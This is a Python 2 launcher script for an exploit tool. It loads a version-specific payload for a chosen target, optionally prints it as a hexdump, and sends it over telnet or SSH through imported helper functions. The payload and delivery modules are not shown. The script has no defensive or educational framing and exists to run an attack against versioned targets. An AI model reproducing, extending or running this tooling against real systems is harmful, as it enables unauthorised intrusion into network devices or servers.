#!/usr/bin/env python

import os
import sys
import warnings

from params import *
from payload import *
from telnet import *
from ssh import *
from hexdump import *


##
##
##
if __name__ == "__main__":
    ##
    warnings.filterwarnings("ignore", category=FutureWarning, append=1)

    ##
    params = Params()
    params.parse()
    params.display()

    ##
    if not os.path.isdir(params.versdir):
        print "cannot find version-specific dir (usually ./versions), are you in the correct dir?"
        sys.exit(1)
    
    ##
    sys.path.append(params.versdir)

    from util import build_version
    if not build_version(params):
        print "failed to build necessary version files!"
        sys.exit(1)

    ##
    payloader = Payload(params)
    if not payloader.load_version_module():
        print "unsupported target version!"
        print "  (are you sure you did \"make [version]\" in versions?)"
        sys.exit(1)
    payload = payloader.get_payload()
    if len(payload) == 0:
        print "failed to create version-specific payload!"
        sys.exit(1)

    if params.verbose:
        print "payload prepared"
    if params.debug:
        print "sending (" + str(len(payload)) + ") " 
        hexdump(payload, 16)

    if params.pretend:
        print "--pretend mode on, aborting exploit"
        sys.exit(0)

    ##
    status = -1

    if params.proto == "telnet":
        status = exploit_over_telnet(params, payload)
    elif params.proto == "ssh":
        status = exploit_over_ssh(params, payload)

    if status != -1:
        sys.exit(status)
    else:
        print "status of exploit unclear, bad news"
        sys.exit(1)
